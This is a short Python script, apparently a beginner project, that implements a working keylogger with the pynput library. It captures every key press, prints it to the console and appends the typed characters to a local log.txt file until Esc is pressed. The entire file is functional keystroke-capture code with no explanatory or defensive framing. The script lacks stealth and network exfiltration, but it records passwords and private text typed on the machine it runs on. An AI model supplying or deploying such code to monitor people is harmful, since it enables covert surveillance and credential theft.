import pynput
from pynput.keyboard import Key, Listener

count=0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)        #It stores all the keystrokes in a list named keys
    count+=1
    print("{0} pressed".format(key))        #Prints the keys that  are pressed
    if count >= 1:
        count=0
        write_file(keys)        
        keys=[]

def write_file(keys):
    with open("log.txt", "a") as f:     #It creates a file named as log.txt
        for key in keys:
            k = str(key).replace("'","")        #It helps in only registering alphabets and numbers
            if k.find("space")>0:       #Space bar moves the word to next line
                f.write('\n')
            elif k.find("Key")== -1:        #It saves the keystrokes in a constant string and not in the format
                f.write(k)

def on_release(key):
    if key == Key.esc:      #on pressing esc the script stops registering
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
